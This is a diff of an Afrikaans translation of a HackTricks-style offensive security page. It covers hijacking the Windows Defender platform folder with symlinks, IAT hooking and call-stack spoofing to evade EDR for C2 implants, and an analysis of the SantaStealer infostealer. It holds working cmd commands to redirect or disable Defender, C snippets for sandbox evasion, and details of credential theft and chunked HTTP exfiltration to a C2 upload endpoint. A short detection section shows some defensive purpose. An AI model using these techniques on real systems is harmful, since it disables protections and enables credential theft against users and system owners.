+Stap-vir-stap (voorbeeld)
+1) Berei 'n skryfbare kloon voor van die huidige platform-gids, bv. `C:\TMP\AV`:
 ```cmd
 set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
 set DST="C:\TMP\AV"
@@ -933,7 +959,7 @@ robocopy %SRC% %DST% /MIR
 ```cmd
 mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
 ```
-3) Trigger-keuse (reboot aanbeveel):
+3) Trigger-keuse (herbegin aanbeveel):
 ```cmd
 shutdown /r /t 0
 ```
@@ -943,33 +969,33 @@ Get-Process MsMpEng | Select-Object Id,Path
 # or
 wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
 ```
-Jy behoort die nuwe proses-pad onder `C:\TMP\AV\` waar te neem en die dienskonfigurasie/registry wat daardie ligging weerspieël.
+Jy behoort die nuwe proses-pad onder `C:\TMP\AV\` en die dienskonfigurasie/registry wat daardie ligging weerspieël, te sien.
 
 Post-exploitation options
 - DLL sideloading/code execution: Plaas/vervang DLLs wat Defender vanaf sy toepassingsgids laai om kode in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
-- Service kill/denial: Verwyder die version-symlink sodat by die volgende begin die geconfigureerde pad nie oplos nie en Defender nie kan begin nie:
+- Service kill/denial: Verwyder die version-symlink sodat by die volgende start die geconfigureerde pad nie oplos nie en Defender nie kan begin nie:
 ```cmd
 rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
 ```
 > [!TIP]
-> Neem kennis dat hierdie tegniek op sigself nie privilege escalation verskaf nie; dit vereis admin-regte.
+> Let wel: hierdie tegniek verskaf nie privilege escalation op sigself nie; dit vereis admin rights.
 
 ## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)
 
-Red teams kan runtime‑ontduiking uit die C2‑implant na die teikenmodule self verskuif deur die Import Address Table (IAT) te hook en geselekteerde APIs deur aanvaller‑beheerde, position‑independent code (PIC) te roeteer. Dit generaliseer ontwijking buite die klein API‑oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.
+Red teams kan runtime evasion uit die C2 implant verskuif na die teikenmodule self deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker-controlled, position‑independent code (PIC) te stuur. Dit generaliseer evasion buite die klein API‑oppervlak wat baie kits openbaar (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.
 
-Hoëvlak‑benadering
-- Stage 'n PIC blob langs die teikenmodule met 'n reflective loader (prepended of companion). Die PIC moet selfstandig en posisie‑onafhanklik wees.
-- Terwyl die host DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT‑inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC‑wrappers te wys.
-- Elke PIC‑wrapper voer ontwijkings uit voordat dit tail‑call na die werklike API‑adres maak. Tipiese ontwijkings sluit in:
-  - Geheue maskering/de‑maskering rondom die oproep (bv. enkripteer beacon‑regios, RWX→RX, verander bladsyname/toestemmings) en herstel daarna.
-  - Call‑stack spoofing: bou 'n onskadelike stack en oorgang na die teiken‑API sodat call‑stack‑analise na verwagte rame oplos.
-- Vir verenigbaarheid, eksporteer 'n interface sodat 'n Aggressor‑script (of ekwivalent) kan registreer watter APIs om te hook vir Beacon, BOFs en post‑ex DLLs.
+High-level approach
+- Plaas 'n PIC blob langs die teikenmodule deur 'n reflective loader te gebruik (prepended of companion). Die PIC moet self‑contained en position‑independent wees.
+- Soos die host DLL laai, loop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT‑inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC‑wrappers wys.
+- Elke PIC‑wrapper voer evasions uit voordat dit 'n tail‑call na die werklike API‑adres maak. Tipiese evasions sluit in:
+  - Memory mask/unmask rondom die oproep (bv. encrypt beacon regions, RWX→RX, verander bladsyname/toestemmings) en herstel ná die oproep.
+  - Call‑stack spoofing: konstrueer 'n onskuldige stack en gaan oor in die teiken‑API sodat call‑stack‑analise na verwagte rame oplos.
+- Vir versoenbaarheid, exporteer 'n interface sodat 'n Aggressor script (of ekwivalente) kan registreer watter APIs gehook moet word vir Beacon, BOFs en post‑ex DLLs.
 
-Waarom IAT hooking hier
+Why IAT hooking here
 - Werk vir enige kode wat die gehookte import gebruik, sonder om tool‑kode te wysig of op Beacon te staatmaak om spesifieke APIs te proxy.
-- Dek post‑ex DLLs: hooking LoadLibrary* laat jou toe om module‑laaie (bv. System.Management.Automation.dll, clr.dll) te onderskep en dieselfde masker/stack‑ontduiking op hul API‑oproepe toe te pas.
-- Herstel betroubare gebruik van proses‑spawning post‑ex opdragte teen call‑stack‑gebaseerde detections deur CreateProcessA/W te wikkel.
+- Dek post‑ex DLLs: deur LoadLibrary* te hook kan jy module‑laaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking/stack evasion op hul API‑oproepe toepas.
+- Herstel betroubare gebruik van process‑spawning post‑ex opdragte teen call‑stack–gebaseerde deteksies deur CreateProcessA/W te omsluit.
 
 Minimal IAT hook sketch (x64 C/C++ pseudocode)
 ```c
@@ -980,37 +1006,37 @@ Minimal IAT hook sketch (x64 C/C++ pseudocode)
 // Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
 ```
 Aantekeninge
-- Pas die patch toe ná relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders like TitanLdr/AceLdr toon hooking tydens DllMain van die gelaaide module.
-- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy gevang het voor patching of via LdrGetProcedureAddress.
-- Gebruik RW → RX-oorgange vir PIC en vermy om skryfbare+uitvoerbare bladsye te laat staan.
+- Pas die patch toe na relocations/ASLR en voor die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking gedurende DllMain van die loaded module.
+- Hou wrappers klein en PIC-safe; los die ware API op via die oorspronklike IAT-waarde wat jy voor patching vasgelê het of via LdrGetProcedureAddress.
+- Gebruik RW → RX transisies vir PIC en vermy om writable+executable pages agter te laat.
 
 Call‑stack spoofing stub
-- Draugr‑style PIC stubs bou 'n valse call chain (terugadresse na onskadelike modules) en pivot dan na die werklike API.
-- Dit omseil opsporing wat verwag dat canonical stacks van Beacon/BOFs na sensitiewe APIs lei.
-- Kombineer met stack cutting/stack stitching techniques om binne verwagte rame te beland voor die API proloog.
+- Draugr‑style PIC stubs bou 'n vals call chain (return addresses into benign modules) en pivot dan in die werklike API.
+- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitive APIs verwag.
+- Kombineer met stack cutting/stack stitching techniques om binne die verwagte frames te beland voor die API prologue.
 
 Operasionele integrasie
-- Voeg die reflective loader voor die post‑ex DLLs sodat die PIC en hooks outomaties geïnitialiseer word wanneer die DLL gelaai word.
-- Gebruik 'n Aggressor script om teiken APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde ontduikingspad sonder kodawysigings.
+- Prepend die reflective loader aan post‑ex DLLs sodat die PIC en hooks outomaties initialise wanneer die DLL gelaai word.
+- Gebruik 'n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder kode-wysigings.
 
-Detection/DFIR oorwegings
-- IAT-integriteit: inskrywings wat oplos na non‑image (heap/anon) adresse; periodieke verifikasie van import pointers.
-- Stapel anomalieë: terugadresse wat nie aan gelaaide images behoort nie; skielike oorgange na non‑image PIC; inkonsekwente RtlUserThreadStart-afkoms.
-- Loader-telemetrie: in-proses skrywings na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-streke geskep by laai.
-- Image-load ontduiking: as daar hooking van LoadLibrary* is, hou dop verdagte laaie van automation/clr assemblies wat gekorreleer word met memory masking events.
+Opsporing/DFIR oorwegings
+- IAT integriteit: inskrywings wat na non‑image (heap/anon) adresse oplos; periodieke verifikasie van import pointers.
+- Stack-afwykings: return addresses wat nie by loaded images behoort nie; skielike transisies na non‑image PIC; inkonsekwente RtlUserThreadStart ancestry.
+- Loader telemetry: in‑process writes na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX regions geskep tydens load.
+- Image‑load evasion: indien hooking van LoadLibrary*, monitor verdagte loads van automation/clr assemblies wat met memory masking events gekorreleer is.
 
 Verwante boublokke en voorbeelde
-- Reflective loaders wat IAT patching tydens laai uitvoer (e.g., TitanLdr, AceLdr)
+- Reflective loaders wat IAT patching tydens load uitvoer (e.g., TitanLdr, AceLdr)
 - Memory masking hooks (e.g., simplehook) en stack‑cutting PIC (stackcutting)
 - PIC call‑stack spoofing stubs (e.g., Draugr)
 
-## SantaStealer Tradecraft for Fileless Evasion and Credential Theft
+## SantaStealer Tradecraft vir Fileless Evasion and Credential Theft
 
 SantaStealer (aka BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in 'n enkele workflow meng.
 
 ### Keyboard layout gating & sandbox delay
 
-- 'n Config flag (`anti_cis`) enumereer die geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Cyrillic layout gevind word, gooi die sample 'n leë `CIS`-merker en beëindig voordat dit stealers hardloop, wat verseker dat dit nooit op uitgesluit lokaliteite aktiveer nie, terwyl dit 'n hunting artefak agterlaat.
+- 'n Config flag (`anti_cis`) enumereer geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Cyrillic layout gevind word, skep die sample 'n leë `CIS` marker en beëindig voor dit die stealers uitvoer, wat verseker dat dit nooit op uitgeslote lokale aktiveer nie terwyl 'n hunting artifact agtergelaat word.
 ```c
 HKL layouts[64];
 int count = GetKeyboardLayoutList(64, layouts);
@@ -1023,22 +1049,21 @@ ExitProcess(0);
 }
 Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
 ```
-### Gelaagde `check_antivm` logic
+### Gelaagde `check_antivm` logika
 
-- Variant A loop deur die proseslys, hash elke naam met 'n pasgemaakte rolling checksum, en vergelyk dit teen ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
-- Variant B inspekteer stelsel-eienskappe (process-count floor, recente uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions te ontdek, en voer timing checks rondom sleeps uit om single-stepping op te spoor. Enige tref veroorsaak afbreking voordat modules geloods word.
+- Variant A loop deur die proseslys, hasj elke naam met 'n maatgemaakte rollende checksum, en vergelyk dit teen ingebedde blokkelyste vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarsnaam en kontroleer werkgidse soos `C:\analysis`.
+- Variant B inspekteer stelsel-eienskappe (process-count floor, recent uptime), roep `OpenServiceA("VBoxGuest")` om VirtualBox additions te detect, en voer timing checks rondom sleeps uit om single-stepping op te spoor. Enige treffers staak vooraleer modules begin.
 
 ### Fileless helper + double ChaCha20 reflective loading
 
-- The primary DLL/EXE embeds a Chromium credential helper that is either dropped to disk or manually mapped in-memory; fileless mode resolves imports/relocations itself so no helper artifacts are written.
-- That helper stores a second-stage DLL encrypted twice with ChaCha20 (two 32-byte keys + 12-byte nonces). After both passes, it reflectively loads the blob (no `LoadLibrary`) and calls exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` derived from [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
-- The ChromElevator routines use direct-syscall reflective process hollowing to inject into a live Chromium browser, inherit AppBound Encryption keys, and decrypt passwords/cookies/credit cards straight from SQLite databases despite ABE hardening.
+- Die primêre DLL/EXE embed 'n Chromium credential helper wat óf na disk gedrop word óf handmatig in-memory gemapped word; fileless mode los imports/relocations self op sodat geen helper-artefakte geskryf word nie.
+- Daardie helper stoor 'n tweede-fase DLL wat twee keer met ChaCha20 geïnkripteer is (two 32-byte keys + 12-byte nonces). Na beide passe laai dit die blob reflectively (no `LoadLibrary`) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
+- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in 'n lewende Chromium browser te inject, erf AppBound Encryption keys, en decrypt passwords/cookies/credit cards direk uit SQLite databases ondanks ABE hardening.
 
+### Modulêre in-memory versameling & chunked HTTP exfil
 
-### Modular in-memory collection & chunked HTTP exfil
-
-- `create_memory_based_log` loop deur 'n globale `memory_generators` function-pointer tabel en spawn een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Elke thread skryf resultate in gedeelde buffers en rapporteer sy lêertelling na 'n ~45s join-venster.
-- Sodra dit klaar is, word alles ge-zip met die staties gekoppelde `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en stream die argief in 10 MB stukke via HTTP POST na `http://<C2>:6767/upload`, spoofing 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Elke stuk voeg `User-Agent: upload`, `auth: <build_id>`, opsionele `w: <campaign_tag>` by, en die laaste stuk heg `complete: true` aan sodat die C2 weet dat herassamelings klaar is.
+- `create_memory_based_log` iterereer 'n globale `memory_generators` function-pointer tabel en spawn een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Elke thread skryf resultate in gedeelde buffers en rapporteer sy file count na 'n ~45s join window.
+- Sodra klaar, word alles gezip met die staties gelinkte `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en stream die argief in 10 MB chunks via HTTP POST na `http://<C2>:6767/upload`, spoofing 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Elke chunk voeg by `User-Agent: upload`, `auth: <build_id>`, opsionele `w: <campaign_tag>`, en die laaste chunk plak `complete: true` sodat die C2 weet reassembly klaar is.
 
 ## References
 
@@ -1068,5 +1093,7 @@ Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxe
 - [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
 - [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
 - [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
+- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
+
 
 {{#include ../banners/hacktricks-training.md}}
